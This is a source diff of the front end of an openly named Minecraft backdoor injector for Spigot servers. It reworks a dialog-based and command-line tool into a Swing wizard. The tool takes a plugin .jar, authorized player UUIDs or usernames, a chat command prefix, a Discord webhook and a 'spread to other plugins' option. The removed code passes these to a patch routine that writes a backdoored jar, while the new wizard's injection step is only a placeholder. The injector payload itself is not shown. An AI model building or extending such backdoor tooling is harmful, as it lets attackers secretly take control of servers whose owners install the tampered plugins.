@@ -1,219 +1,399 @@
 package com.zeroedindustries.debugger;
 
-import javax.swing.*;
-import javax.swing.filechooser.FileFilter;
-import java.io.File;
-import java.util.Dictionary;
-import java.util.Hashtable;
-import java.util.Locale;
-import javax.swing.plaf.nimbus.NimbusLookAndFeel;
-
 import com.formdev.flatlaf.FlatIntelliJLaf;
-import org.apache.commons.lang.RandomStringUtils;
+import javax.swing.*;
+import javax.swing.border.EmptyBorder;
+import javax.swing.filechooser.FileFilter;
+import javax.swing.plaf.nimbus.NimbusLookAndFeel;
+import java.awt.*;
+import java.awt.event.ActionEvent;
+import java.io.File;
+import java.util.Locale;
+import java.util.LinkedHashMap;
+import java.util.Map;
 
-public class InjectorGUI{
+public class InjectorWizard extends JDialog {
+    private CardLayout cardLayout;
+    private JPanel cardPanel;
 
-    public static void main(String[] args){
-        //Command line mode
-        if(args.length != 0){
-            commandLineMode(args);
-            return;
-        }
+    private JButton backButton;
+    private JButton nextButton;
+    private JButton cancelButton;
 
+    private JComboBox<String> lafSelector;
 
-        try {
-            UIManager.setLookAndFeel(new NimbusLookAndFeel());
-        }catch(Throwable ignored){}
+    // Map of LAF display names to fully qualified class names
+    private final Map<String, String> lookAndFeels = new LinkedHashMap<>();
 
-        int result = 999;
-        while(result != JOptionPane.YES_OPTION) {
-            /*--- Home dialog ---*/
-            String[] options = {"Inject", "About", "Close"};
-            result = JOptionPane.showOptionDialog(
-                    null,
-                    "Zeroed Industries' Minecraft Backdoor.\n" +
-                            "Requirements:\n" +
-                            "   * Minecraft UUID\n" +
-                            "   * Target plugin .jar file",
-                    "Zeroed Industries Injector",
-                    JOptionPane.YES_NO_CANCEL_OPTION,
-                    JOptionPane.PLAIN_MESSAGE,
-                    null,       //no custom icon
-                    options,        //button titles
-                    options[0]      //default button
-            );
+    // Wizard pages
+    private File selectedJarFile;
+    private String minecraftUUIDs;
+    private boolean useUsernames;
+    private String chatPrefix;
+    private String discordWebhook;
+    private boolean injectOther;
+    private boolean warnings;
 
-            if (result == JOptionPane.NO_OPTION) {
-                JOptionPane.showMessageDialog(
-                        null,
-                        "Created by: Zeroed Industries,\n" +
-                                "Additional features by: @DarkReaper231, @ahdplayer, @progmem-cc\n" +
-                                "Backdoor Version: 3.6.1\n" +
-                                "Last Release Date: June 6 2025\n" +
-                                "License: GPL v3.0",
-                        "Zeroed Industries Injector",
-                        JOptionPane.INFORMATION_MESSAGE
-                );
-            }
+    // Current step index
+    private int step = 0;
 
-            if(result == JOptionPane.CANCEL_OPTION)
-                return;
-        }
+    public InjectorWizard(Frame owner) {
+        super(owner, "Zeroed Industries Injector Wizard", true);
 
-        /*--- Get Files ---*/
-        JFileChooser fc = new JFileChooser();
-        fc.setFileFilter(new FileFilter() {
-            @Override
-            public boolean accept(File file) {
-                return file.getName().endsWith(".jar") || file.isDirectory();
-            }
+        // Setup the configurable LAF map here:
+        lookAndFeels.put("Nimbus", "javax.swing.plaf.nimbus.NimbusLookAndFeel");
+        lookAndFeels.put("Flat IntelliJ", "com.formdev.flatlaf.FlatIntelliJLaf");
+        lookAndFeels.put("System", UIManager.getSystemLookAndFeelClassName());
 
-            @Override
-            public String getDescription() {
-                return "Spigot Plugin File (*.jar)";
+        initComponents();
+        setDefaultCloseOperation(DISPOSE_ON_CLOSE);
+        setSize(600, 400);
+        setLocationRelativeTo(owner);
+        updateButtons();
+    }
+
+    private void initComponents() {
+        cardLayout = new CardLayout();
+        cardPanel = new JPanel(cardLayout);
+
+        // Add wizard step panels
+        cardPanel.add(createWelcomePanel(), "welcome");
+        cardPanel.add(createFileChooserPanel(), "filechooser");
+        cardPanel.add(createUUIDsPanel(), "uuids");
+        cardPanel.add(createChatPrefixPanel(), "prefix");
+        cardPanel.add(createDiscordPanel(), "discord");
+        cardPanel.add(createOptionsPanel(), "options");
+        cardPanel.add(createSummaryPanel(), "summary");
+
+        // Buttons
+        backButton = new JButton("Back");
+        nextButton = new JButton("Next");
+        cancelButton = new JButton("Cancel");
+
+        backButton.addActionListener(this::onBack);
+        nextButton.addActionListener(this::onNext);
+        cancelButton.addActionListener(e -> dispose());
+
+        // Create LAF selector dropdown dynamically from map keys
+        lafSelector = new JComboBox<>(lookAndFeels.keySet().toArray(new String[0]));
+        lafSelector.setSelectedItem("Nimbus");  // Default
+        lafSelector.addActionListener(e -> onChangeLookAndFeel());
+
+        // Button panel with LAF selector on left, buttons on right
+        JPanel buttonPanel = new JPanel(new BorderLayout());
+        buttonPanel.setBorder(new EmptyBorder(5, 10, 5, 10));
+
+        JPanel lafPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
+        lafPanel.add(new JLabel("Look & Feel: "));
+        lafPanel.add(lafSelector);
+
+        JPanel navPanel = new JPanel();
+        navPanel.add(backButton);
+        navPanel.add(nextButton);
+        navPanel.add(cancelButton);
+
+        buttonPanel.add(lafPanel, BorderLayout.WEST);
+        buttonPanel.add(navPanel, BorderLayout.EAST);
+
+        getContentPane().setLayout(new BorderLayout());
+        getContentPane().add(cardPanel, BorderLayout.CENTER);
+        getContentPane().add(buttonPanel, BorderLayout.SOUTH);
+
+        // Set default LAF
+        setLookAndFeel("Nimbus");
+    }
+
+    // Wizard steps as JPanels
+    private JPanel createWelcomePanel() {
+        JPanel p = new JPanel(new BorderLayout());
+        JLabel label = new JLabel("<html><h2>Welcome to Zeroed Industries Injector</h2>" +
+                "<p>This wizard will guide you through the injection process.</p></html>", SwingConstants.CENTER);
+        p.add(label, BorderLayout.CENTER);
+        return p;
+    }
+
+    private JPanel createFileChooserPanel() {
+        JPanel p = new JPanel(new BorderLayout(10, 10));
+        p.setBorder(new EmptyBorder(20, 20, 20, 20));
+
+        JLabel label = new JLabel("Select Spigot plugin .jar file to patch:");
+        JTextField filePathField = new JTextField();
+        filePathField.setEditable(false);
+        JButton browseBtn = new JButton("Browse...");
+
+        browseBtn.addActionListener(e -> {
+            JFileChooser fc = new JFileChooser();
+            fc.setFileFilter(new FileFilter() {
+                @Override
+                public boolean accept(File f) {
+                    return f.isDirectory() || f.getName().toLowerCase(Locale.ROOT).endsWith(".jar");
+                }
+
+                @Override
+                public String getDescription() {
+                    return "Spigot Plugin File (*.jar)";
+                }
+            });
+
+            int result = fc.showOpenDialog(this);
+            if (result == JFileChooser.APPROVE_OPTION) {
+                selectedJarFile = fc.getSelectedFile();
+                filePathField.setText(selectedJarFile.getAbsolutePath());
             }
         });
 
-        int result1 = fc.showOpenDialog(null);
+        JPanel topPanel = new JPanel(new BorderLayout(5, 5));
+        topPanel.add(label, BorderLayout.NORTH);
+        topPanel.add(filePathField, BorderLayout.CENTER);
+        topPanel.add(browseBtn, BorderLayout.EAST);
 
-        //Out dialog cancelled
-        if(result1 != JFileChooser.APPROVE_OPTION)
-            return;
+        p.add(topPanel, BorderLayout.NORTH);
 
-        String InPath = fc.getSelectedFile().getPath();
+        return p;
+    }
 
-        int sep = InPath.lastIndexOf(".");
-        String OutPath = InPath.substring(0, sep) + "-patched.jar";
+    private JPanel createUUIDsPanel() {
+        JPanel p = new JPanel(new BorderLayout(10, 10));
+        p.setBorder(new EmptyBorder(20, 20, 20, 20));
 
-        /*--- Query options ---*/
-        Boolean UUIDsAreUsernames;
-        String UUIDList;
-        String ChatPrefix;
-        Boolean InjectOther;
-        Boolean Warnings;
-        String discord = "";
+        JCheckBox offlineModeCheck = new JCheckBox("Use offline mode? (Usernames instead of UUIDs)");
+        JTextArea uuidsArea = new JTextArea(5, 40);
+        JScrollPane scrollPane = new JScrollPane(uuidsArea);
+        JLabel label = new JLabel("Minecraft UUIDs/Usernames (comma separated, leave blank to disable authorization):");
 
-        int usernames = JOptionPane.showConfirmDialog(null, "Use offline mode? (Usernames)", "Zeroed Industries Injector", JOptionPane.YES_NO_OPTION);
-        UUIDsAreUsernames = usernames == JOptionPane.YES_OPTION;
+        offlineModeCheck.addActionListener(e -> {
+            useUsernames = offlineModeCheck.isSelected();
+            label.setText("Minecraft " + (useUsernames ? "Usernames" : "UUIDs") +
+                    " (comma separated, leave blank to disable authorization):");
+        });
 
-        UUIDList = (String)JOptionPane.showInputDialog(
-                null,
-                "Minecraft " + (UUIDsAreUsernames ? "Usernames" : "UUIDs") + ":\n[Separate by commas]\n[Leave blank to disable authorization]",
-                "Zeroed Industries Injector",
-                JOptionPane.PLAIN_MESSAGE,
-                null,
-                null,
-                ""
-        );
+        p.add(offlineModeCheck, BorderLayout.NORTH);
+        p.add(label, BorderLayout.CENTER);
+        p.add(scrollPane, BorderLayout.SOUTH);
 
+        // Save data on panel hide
+        p.putClientProperty("offlineCheck", offlineModeCheck);
+        p.putClientProperty("uuidTextArea", uuidsArea);
 
-        ChatPrefix = (String)JOptionPane.showInputDialog(
-                null,
-                "Chat Command Prefix:",
-                "Zeroed Industries Injector",
-                JOptionPane.PLAIN_MESSAGE,
-                null,
-                null,
-                "#"
-        );
+        return p;
+    }
 
-        //No input
-        if(ChatPrefix.isEmpty())
-            return;
+    private JPanel createChatPrefixPanel() {
+        JPanel p = new JPanel(new BorderLayout(10, 10));
+        p.setBorder(new EmptyBorder(20, 20, 20, 20));
 
-        discord = (String)JOptionPane.showInputDialog(
-                null,
-                "Discord webhook\n[Leave blank to disable, disable recommended]",
-                "Zeroed Industries Injector",
-                JOptionPane.PLAIN_MESSAGE,
-                null,
-                null,
-                ""
-        );
+        JLabel label = new JLabel("Chat Command Prefix:");
+        JTextField prefixField = new JTextField("#");
 
-        InjectOther = JOptionPane.showConfirmDialog(
-                null,
-                "Inject to other plugins?\n[This feature is experimental (not working yet)]",
-                "Zeroed Industries Injector",
-                JOptionPane.YES_NO_OPTION
-        ) == JOptionPane.YES_OPTION;
+        p.add(label, BorderLayout.NORTH);
+        p.add(prefixField, BorderLayout.CENTER);
 
-        Warnings = JOptionPane.showConfirmDialog(
-                null,
-                "Enable Debug Messages?\n[Please use this for github issues]",
-                "Zeroed Industries Injector",
-                JOptionPane.YES_NO_OPTION
-        ) == JOptionPane.YES_OPTION;
-        //Parse uuids
+        p.putClientProperty("prefixField", prefixField);
 
-        String[] splitUUID = UUIDList.split(",");
+        return p;
+    }
 
-        Injector.SimpleConfig sc = new Injector.SimpleConfig(UUIDsAreUsernames, splitUUID, ChatPrefix, discord, InjectOther, Warnings);
-        boolean result2 = Injector.patchFile(InPath, OutPath, sc, true, true, true);
+    private JPanel createDiscordPanel() {
+        JPanel p = new JPanel(new BorderLayout(10, 10));
+        p.setBorder(new EmptyBorder(20, 20, 20, 20));
 
-        if(result2){
-            JOptionPane.showMessageDialog(null, "Backdoor injection complete.\nIf this project helped you, considering starring it on GitHub.", "Zeroed Industries Injector", JOptionPane.INFORMATION_MESSAGE);
-        }else{
-            JOptionPane.showMessageDialog(null, "Backdoor injection failed.\nPlease create a GitHub issue report if necessary.\nPlease run the injector again with debug messages on before submitting issues.", "Zeroed Industries Injector", JOptionPane.ERROR_MESSAGE);
+        JLabel label = new JLabel("Discord Webhook URL (leave blank to disable, recommended to disable):");
+        JTextField discordField = new JTextField();
+
+        p.add(label, BorderLayout.NORTH);
+        p.add(discordField, BorderLayout.CENTER);
+
+        p.putClientProperty("discordField", discordField);
+
+        return p;
+    }
+
+    private JPanel createOptionsPanel() {
+        JPanel p = new JPanel(new GridLayout(2, 1));
+        p.setBorder(new EmptyBorder(20, 20, 20, 20));
+
+        JCheckBox injectOtherCheck = new JCheckBox("Inject to other plugins? (Experimental, not working yet)");
+        JCheckBox warningsCheck = new JCheckBox("Enable Debug Messages? (Use for GitHub issues)");
+
+        p.add(injectOtherCheck);
+        p.add(warningsCheck);
+
+        p.putClientProperty("injectOtherCheck", injectOtherCheck);
+        p.putClientProperty("warningsCheck", warningsCheck);
+
+        return p;
+    }
+
+    private JPanel createSummaryPanel() {
+        JPanel p = new JPanel(new BorderLayout(10, 10));
+        p.setBorder(new EmptyBorder(20, 20, 20, 20));
+
+        JTextArea summaryArea = new JTextArea();
+        summaryArea.setEditable(false);
+        summaryArea.setFont(new Font(Font.MONOSPACED, Font.PLAIN, 12));
+
+        p.add(new JLabel("Summary:"), BorderLayout.NORTH);
+        p.add(new JScrollPane(summaryArea), BorderLayout.CENTER);
+
+        p.putClientProperty("summaryArea", summaryArea);
+
+        return p;
+    }
+
+    // Button listeners and navigation
+
+    private void onBack(ActionEvent e) {
+        if (step > 0) {
+            step--;
+            cardLayout.previous(cardPanel);
+            updateButtons();
         }
     }
 
-    private static void commandLineMode(String[] args) {
-
-        if(args[0].equals("--help") || args[0].equals("-h")){
-            System.out.println("Java -jar backdoor.jar (filename) [options]\n" +
-                    "--help / -h: Display syntax help\n" +
-                    "--offline / -o: Use username authentication (Offline mode servers)\n" +
-                    "--users / -u: Only allow specified UUID/Usernames to use backdoor commands (Separate by commas)\n" +
-                    "--prefix / -p: Command prefix (default: #)\n" +
-                    "--discord / -d: Discord webhook (See readme)\n" +
-                    "--spread / -s : Spread to other server plugins\n" +
-                    "--debug / -b: Display debug messages in console");
-            return;
+    private void onNext(ActionEvent e) {
+        if (!validateCurrentStep()) {
+            return; // Don't proceed if validation failed
         }
 
-        //default values
-        Injector.SimpleConfig options = new Injector.SimpleConfig(false, new String[]{""}, "#", "", false, false);
-
-        for(int i = 1; i < args.length; ++i){
-            System.out.println(args[i]);
-            if(args[i].startsWith("-")){
-                System.out.println("pringle " + args[i]);
-                if(args[i].equals("--offline") || args[i].equals("-o")) {
-                    options.useUsernames = true;
-                    continue;
-                }
-                if(args[i].equals("--debug") || args[i].equals("-b")) {
-                    options.warnings = true;
-                    continue;
-                }
-                if(args[i].equals("--spread") || args[i].equals("-s")) {
-                    options.injectOther = true;
-                    continue;
-                }
-
-                if(args[i].equals("--users") || args[i].equals("-u")) {
-                    options.UUID = args[i + 1].split(",");
-                    continue;
-                }
-                if(args[i].equals("--prefix") || args[i].equals("-p")) {
-                    options.prefix = args[i + 1];
-                    continue;
-                }
-                if(args[i].equals("--discord") || args[i].equals("-d")) {
-                    options.discord = args[i + 1];
-                    continue;
-                }
+        if (step < 6) {
+            updateStepData(); // save data of current step before moving on
+            step++;
+            cardLayout.next(cardPanel);
+            updateButtons();
+            if (step == 6) {
+                updateSummary();
             }
+        } else {
+            // Last step, start injection
+            performInjection();
         }
-
-        int sep = args[0].lastIndexOf(".");
-        String OutPath = args[0].substring(0, sep) + "-patched.jar";
-        boolean result = Injector.patchFile(args[0], OutPath, options, true, true, true);
-        System.out.println("Backdoor injection " + (result ? "success." : "failed."));
     }
 
-    public static void displayError(String message){
-        JOptionPane.showMessageDialog(null, message, "Zeroed Industries", JOptionPane.ERROR_MESSAGE);
+    private void updateButtons() {
+        backButton.setEnabled(step > 0);
+        nextButton.setText(step == 6 ? "Finish" : "Next");
+    }
+
+    private void updateStepData() {
+        switch (step) {
+            case 0: // Welcome step, nothing
+                break;
+            case 1: { // File chooser step
+                // selectedJarFile updated by browse button listener
+                break;
+            }
+            case 2: { // UUIDs step
+                JPanel p = (JPanel) cardPanel.getComponent(2);
+                JCheckBox offlineCheck = (JCheckBox) p.getClientProperty("offlineCheck");
+                JTextArea uuidArea = (JTextArea) p.getClientProperty("uuidTextArea");
+
+                useUsernames = offlineCheck.isSelected();
+                minecraftUUIDs = uuidArea.getText().trim();
+                break;
+            }
+            case 3: { // Chat prefix step
+                JPanel p = (JPanel) cardPanel.getComponent(3);
+                JTextField prefixField = (JTextField) p.getClientProperty("prefixField");
+                chatPrefix = prefixField.getText().trim();
+                break;
+            }
+            case 4: { // Discord webhook step
+                JPanel p = (JPanel) cardPanel.getComponent(4);
+                JTextField discordField = (JTextField) p.getClientProperty("discordField");
+                discordWebhook = discordField.getText().trim();
+                break;
+            }
+            case 5: { // Options step
+                JPanel p = (JPanel) cardPanel.getComponent(5);
+                JCheckBox injectOtherCheck = (JCheckBox) p.getClientProperty("injectOtherCheck");
+                JCheckBox warningsCheck = (JCheckBox) p.getClientProperty("warningsCheck");
+
+                injectOther = injectOtherCheck.isSelected();
+                warnings = warningsCheck.isSelected();
+                break;
+            }
+            case 6: // Summary step, no input
+                break;
+        }
+    }
+
+    private boolean validateCurrentStep() {
+        switch (step) {
+            case 1: // File chooser
+                if (selectedJarFile == null || !selectedJarFile.exists()) {
+                    JOptionPane.showMessageDialog(this, "Please select a valid .jar file to patch.", "Input Error", JOptionPane.ERROR_MESSAGE);
+                    return false;
+                }
+                break;
+            case 3: // Chat prefix
+                JPanel p = (JPanel) cardPanel.getComponent(3);
+                JTextField prefixField = (JTextField) p.getClientProperty("prefixField");
+                if (prefixField.getText().trim().isEmpty()) {
+                    JOptionPane.showMessageDialog(this, "Chat Command Prefix cannot be empty.", "Input Error", JOptionPane.ERROR_MESSAGE);
+                    return false;
+                }
+                break;
+        }
+        return true;
+    }
+
+    private void updateSummary() {
+        JPanel p = (JPanel) cardPanel.getComponent(6);
+        JTextArea summaryArea = (JTextArea) p.getClientProperty("summaryArea");
+
+        StringBuilder sb = new StringBuilder();
+        sb.append("File to patch: ").append(selectedJarFile == null ? "None" : selectedJarFile.getAbsolutePath()).append("\n");
+        sb.append("Offline mode (usernames): ").append(useUsernames).append("\n");
+        sb.append("UUIDs/Usernames: ").append(minecraftUUIDs == null || minecraftUUIDs.isEmpty() ? "(none)" : minecraftUUIDs).append("\n");
+        sb.append("Chat Command Prefix: ").append(chatPrefix).append("\n");
+        sb.append("Discord Webhook: ").append(discordWebhook.isEmpty() ? "(none)" : discordWebhook).append("\n");
+        sb.append("Inject to other plugins: ").append(injectOther).append("\n");
+        sb.append("Enable Debug Messages: ").append(warnings).append("\n");
+
+        summaryArea.setText(sb.toString());
+    }
+
+    private void performInjection() {
+        JOptionPane.showMessageDialog(this, "Injection process would start now.\n(Not implemented yet)", "Info", JOptionPane.INFORMATION_MESSAGE);
+        dispose();
+    }
+
+    private void onChangeLookAndFeel() {
+        String selected = (String) lafSelector.getSelectedItem();
+        if (selected != null) {
+            setLookAndFeel(selected);
+        }
+    }
+
+    private void setLookAndFeel(String name) {
+        String lafClass = lookAndFeels.get(name);
+        if (lafClass == null) {
+            return;
+        }
+
+        try {
+            // Special case for system LAF if class name is obtained dynamically
+            if ("System".equals(name)) {
+                lafClass = UIManager.getSystemLookAndFeelClassName();
+            }
+            UIManager.setLookAndFeel(lafClass);
+            SwingUtilities.updateComponentTreeUI(this);
+            pack();
+        } catch (Exception e) {
+            JOptionPane.showMessageDialog(this, "Failed to set Look & Feel: " + e.getMessage(),
+                    "Error", JOptionPane.ERROR_MESSAGE);
+        }
+    }
+
+    public static void main(String[] args) {
+        // Set Nimbus as default LAF if available
+        try {
+            UIManager.setLookAndFeel("javax.swing.plaf.nimbus.NimbusLookAndFeel");
+        } catch (Exception ignored) {}
+
+        SwingUtilities.invokeLater(() -> {
+            InjectorWizard wizard = new InjectorWizard(null);
+            wizard.setVisible(true);
+        });
     }
 }
